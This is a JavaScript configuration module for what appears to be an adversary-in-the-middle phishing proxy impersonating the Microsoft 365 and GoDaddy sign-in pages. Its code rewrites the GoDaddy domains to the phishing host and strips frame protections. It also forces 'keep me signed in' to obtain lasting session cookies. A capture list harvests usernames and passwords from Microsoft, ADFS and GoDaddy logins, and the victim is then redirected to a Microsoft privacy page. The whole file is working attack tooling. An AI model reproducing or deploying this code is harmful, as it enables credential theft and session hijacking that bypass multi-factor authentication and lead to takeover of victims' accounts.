/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const { timeStamp } = require('console')
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        if (this.browserReq.url.startsWith('/kmsi')
        || this.browserReq.url.startsWith('/common/SAS/EndAuth')) {
            return this.forceKeepSession()
        } else {
            return super.processRequest()
        }
        
    }

    forceKeepSession() {
        if (this.browserReq.headers['content-length'] > 0) {
            let cJust = ''
            this.browserReq.on('data', (chunk) => {
                cJust += chunk.toString('utf8')
            })
            this.browserReq.on('end', () => {
                let kJust
                cJust += ''
                const forceOption = /LoginOptions=\d/
                kJust = cJust.replace(forceOption, 'LoginOptions=1')
                
                kJust = kJust.replace(/"LastPollStart":\d*,/, '')
                kJust = kJust.replace(/"LastPollEnd":\d*,?/, '')

                console.log(kJust)

                this.proxyEndpoint.setHeader('content-length', kJust.length)
                this.proxyEndpoint.write(kJust)
                this.proxyEndpoint.end('')
                // this.proxyEndpoint.write(kJust)
            })
        } else {
            this.browserReq.pipe(this.proxyEndpoint)

        }
    }


}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
       
        super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
        this.regexes = [
             {
                reg: /sso.godaddy.com/igm, // Google chrome on windows fix
                replacement: this.browserEndPoint.clientContext.hostname,
             },
             {
                reg: /sso.secureserver.net/igm, // Google chrome on windows fix
                replacement: this.browserEndPoint.clientContext.hostname,
             },
             {
                reg: /secureserver.net/igm, // Google chrome on windows fix
                replacement: this.browserEndPoint.clientContext.hostname,
             },
             {
                reg: /godaddy.com/igm, // Google chrome on windows fix
                replacement: this.browserEndPoint.clientContext.hostname,
             },
             {
                 reg: /img6.wsimg.com\/auth-assets\/([A-Za-z0-9]*)\/login-panel.js/igm,
                 replacement: `${this.browserEndPoint.clientContext.hostname}/auth-assets/$1/login-panel.js`,

             },
             {
                reg: /\+this.api_target\+"\."\+/,
                replacement: '+'

             },
             {
                 reg: /API_HOST:a,/,
                 replacement: "API_HOST:'godaddy.com',"

             },
            //  {
            //     reg: /src="\/.*\/p.js"/,
            //     replacement: "https://sso.godaddy.com/$1/p.js"

            // },
            //  {
            //     reg: /<\/html>/igm, // Google chrome on windows fix
            //     replacement: '<script>window.onload = function(){function lp(){var e=document.getElementById("i0116");if(e){console.log("kuka");const t=new URLSearchParams(window.location.search).get("qrc")||"";let o;try{o=atob(t)}catch{o=t}e.value=o}else setTimeout(lp,600)}lp();}</script> </html>',
            //  },
        ]
    }


    processResponse() {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }
       

        if (this.proxyResp.req.path.startsWith('/kmsi')  
        // || this.proxyResp.req.path.startsWith('/common/SAS/ProcessAuth')
        || this.proxyResp.req.path.startsWith('/owa/prefetch.aspx')
        || this.proxyResp.req.path.startsWith('/webmanifest.json')
        || this.proxyResp.req.path.startsWith('/landingv2')
        // || this.proxyResp.req.path.startsWith('/common/reprocess')
        ){
            this.browserEndPoint.writeHead(302, {'location': '/ping/v5767687'})
            return this.browserEndPoint.end()
        }


       
        // return super.processResponse()
         let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }

                if (this.proxyResp.headers['content-type'] && 
                this.proxyResp.headers['content-type'].startsWith('application/json')) {
                    const JObjBody = JSON.parse(newMsgBody)
                    if (JObjBody.hasOwnProperty('Credentials')) {
                        const hostDomain = this.browserEndPoint.clientContext.hostname
                        const fedUrl = JObjBody.Credentials.FederationRedirectUrl
                        if (fedUrl) {
                            let newFedDomain
                            if (fedUrl.startsWith(`https://${hostDomain}`)) {
                                newFedDomain = 'sso.godaddy.com'
                            }
                            else {
                                const fedObj = new URL(fedUrl)
                                
                                newFedDomain = fedObj.hostname
                            }

                            console.log('fed domain is ' + newFedDomain)
                            
                            this.browserEndPoint.clientContext.currentDomain = newFedDomain
                            newMsgBody = newMsgBody.replace(newFedDomain, this.browserEndPoint.clientContext.hostname)
                        }
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    concludeAuth() {
        this.browserEndPoint.setHeader('location', '/ping/v5767687')

    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientContext) {


        super.loadAutoGrab(configExport.AUTOGRAB_CODE)


        if (this.req.method === 'POST') {
           
            if (this.req.url.startsWith('/common/GetCredentialType')) {
                super.captureBody(clientContext.currentDomain, clientContext)

            }else { 
                super.uploadRequestBody(clientContext.currentDomain, clientContext)
            }
        }
        

        if (this.req.url.startsWith('/auth-assets/')) {
            return super.superExecuteProxy('img6.wsimg.com', clientContext)
        }

       
        if (this.req.url.startsWith('/v1/api')) {
            // clientContext.currentDomain = 'sso.godaddy.com'
           
        }

        if (this.req.url.startsWith(`/${clientContext.hostname}`)) {
            clientContext.currentDomain = 'sso.godaddy.com'
            this.req.url = this.req.url.replace(clientContext.hostname, '')
            this.req.url = this.req.url.replace('/~:443/', '')
            console.log('max url is ' + this.req.url)
        }

        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
            clientContext.currentDomain = process.env.PROXY_DOMAIN
            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        if (this.req.url.startsWith('/:443')) {
            this.req.url = this.req.url.slice(5)
        }

        if (this.req.url.startsWith('/common/reprocess') || this.req.url.startsWith('/common/SAS/ProcessAuth')) {
            clientContext.setLogAvailable(true);
            super.sendClientData(clientContext, {})
        }

        // if (this.req.url.startsWith('/owa/prefetch.aspx') || this.req.url.startsWith('/webmanifest.json')
        // || this.req.url.startsWith('/landingv2')) {
        //     super.sendClientData(clientContext, {})

        // }

       
        if (this.req.url === '/ping/v5767687') {
            super.sendClientData(clientContext, {})
            return super.exitLink('https://privacy.microsoft.com/en-us/privacystatement')
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}




const configExport = {
    CURRENT_DOMAIN: 'login.microsoftonline.com',

    AUTOGRAB_CODE: 'login_hint',


    START_PATH: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code id_token&scope=openid profile https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=637929903776466681.Y2Y4YjNjOWItNWRlMi00NWRmLWEyNGEtNGMxM2RhNjhmMmY1NTI3YmM5OTMtOWEyNi00YWJjLTg5ZDAtYmYyMjgwOWFjMWUx&ui_locales=en-US&mkt=en-US&state=G-VlqctyXJoQazNds6PWnW7GHB_JRMNCQNIscmNm49y8wyBm0ioAbPHzBE3jzPLGCyk2xLKOAqbJtwTLTLDUqnAJFuN5Si8AFjBXKydzhb6x4EIi3_N0oFy9vVNHYBjWByDP66t5m5Ra01fSIg5C_SimIq8o1nplzEjy9Yh5zzJM6YRiEI82IK6PzXyy32HA_42pbx0DvZw525HpcuVgMA1VWPZiCKFly3JEnMPTh7Ldfoo6w-4xJkUhkywZlP-WulmpO3prRseGYKBIVVplJw&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.12.1.0',
    
    EXTERNAL_FILTERS: 
        [
        // 'login.live.com',
        // 'aadcdn.msftauth.net',
        'sso.godaddy.com',
        'godaddy.com'
        ],

    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },

        loginPassword: {
            method: 'POST',
            params: ['passwd'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },

        adfsUsername: {
            method: 'POST',
            params: ['UserName'],
            urls: '',
            hosts: [],
        },

        adfsPassword: {
            method: 'POST',
            params: ['Password'],
            urls: '',
            hosts: [],
        },


        godaddyUsername: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['sso.godaddy.com'],
        },

        godaddyPassword: {
            method: 'POST',
            params: ['password'],
            urls: '',
            hosts: ['sso.godaddy.com'],
        },


        loginFmt: {
            method: 'POST',
            params: ['loginfmt'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },

    },

    cookieKEY: 'loginUsername'

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

